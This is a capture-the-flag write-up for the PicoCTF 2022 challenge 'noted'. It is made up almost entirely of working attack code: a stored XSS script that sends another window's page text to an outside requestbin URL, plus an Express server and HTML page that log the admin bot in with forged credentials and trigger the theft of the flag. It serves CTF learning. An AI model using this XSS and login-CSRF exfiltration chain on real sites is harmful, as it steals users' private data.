# noted (PicoCTF 2022)

Solution:

Step 1:

create a script XSS on your acc with the following `titile`:any, `content`:

```js
<script>
  if (window.location.search.includes('pwn'))
    window.location = 'https://requestbin.net/r/gesggdo3?' + window.open('', 'pwn').document.body.textContent
</script>
```

Step 2:

Create 2 file:

`app.js`:
```js
let express = require('express');
let app = express();

app.get('/home', function(req, res) {
    res.sendFile(__dirname + '/home.html');
});

let port = 5050;
let server = app.listen(port);
console.log('Local server running on port: ' + port);
```

`home.html`:

```html
data:text/html,
<form action="http://0.0.0.0:8080/login" method=POST id=pwn target=_blank>
  <input type="text" name="username" value="123"><input type="text" name="password" value="123">
</form>
<script>
  window.open('http://0.0.0.0:8080/notes', 'pwn')
  setTimeout(`pwn.submit()`, 1000);
  setTimeout(`window.location='http://0.0.0.0:8080/notes?pwn'`, 1500);
</script>
```

After create 2 file, run it on server ngrok.

Step 3:

Send bot admin your server url.

Now we wait 2,5 seconds -> Flag will send to `requestsbin`.
